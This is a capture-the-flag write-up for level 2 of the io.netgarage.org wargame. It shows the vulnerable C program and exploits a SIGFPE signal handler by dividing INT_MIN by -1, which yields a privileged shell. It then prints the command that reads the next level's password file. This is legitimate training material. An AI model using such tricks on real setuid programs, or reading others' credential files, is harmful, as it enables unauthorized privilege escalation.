# io.netgarage.org: level2
Once again, we start the challenge by logging into the challenge server
```
ssh level1@io.netgarage.org
password: password gained from completing previous level
```
```
 ______   _____
/\__  _\ /\  __`\       Levels are in /levels
\/_/\ \/ \ \ \/\ \      Passes are in ~/.pass
   \ \ \  \ \ \ \ \     Readmes in /home/level1
    \_\ \__\ \ \_\ \
    /\_____\\ \_____\   Server admin: bla (blapost@gmail.com)
    \/_____/ \/_____/
```
We `cd` to `/levels` and run `./level02`:
```
level2@io:/levels$ ./level02
source code is available in level02.c

level2@io:/levels$
```
Not much happens. We follow the wize advice of the program and look at the 
source:
```C
//a little fun brought to you by bla

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void catcher(int a)
{
    setresuid(geteuid(),geteuid(),geteuid());
	printf("WIN!\n");
    system("/bin/sh");
    exit(0);
}

int main(int argc, char **argv)
{
	puts("source code is available in level02.c\n");

    if (argc != 3 || !atoi(argv[2]))
        return 1;
    signal(SIGFPE, catcher);
    return abs(atoi(argv[1])) / atoi(argv[2]);
}
```
The program expects 3 arguments, 2 being command line arguments, and it returns
the absolute value of the first argument, divided by the second argument. The
function we want to call is the `catcher(int a)` function. We see that a signal
handler is set up for floating point exceptions, `SIG_FPE`, that will call
`catcher()` if a `SIG_FPE` happens. We need a way to cause a `SIG_FPE`, which
presumably would have to do with the 2 numbers we pass that get divided.

From the man page of `signal()`:
```
NOTES
       The effects of signal() in a multithreaded process are unspecified.

       According to POSIX, the behavior of a process is undefined after it 
       ignores a SIGFPE, SIGILL, or SIGSEGV  signal  that  was not generated 
       by kill(2) or raise(3).  Integer division by zero has undefined result. 
       On some architectures it will gener- ate a SIGFPE signal.  (Also 
       dividing the most negative integer by -1 may generate SIGFPE.)  
       Ignoring this signal might lead to an endless loop.
```
Importantly:
```
dividing the most negative integer by -1 may generate SIGFPE.
```
Great!
Assuming that an `int` is 32-bit, the most negative integer is `-2^31`, or 
`-2147483648`.
Let's try using `-2147483648` and `-1`:
```
level2@io:/levels$ ./level02 -2147483648 -1
source code is available in level02.c

WIN!
sh-4.3$
```
And we got a shell! We can now read the pass from `/home/level3/.pass`:
```
sh-4.3$ cat /home/level3/.pass
<REDACTED>
```
And so, level02 is solved.

Happy Hacking!

~MarcoSi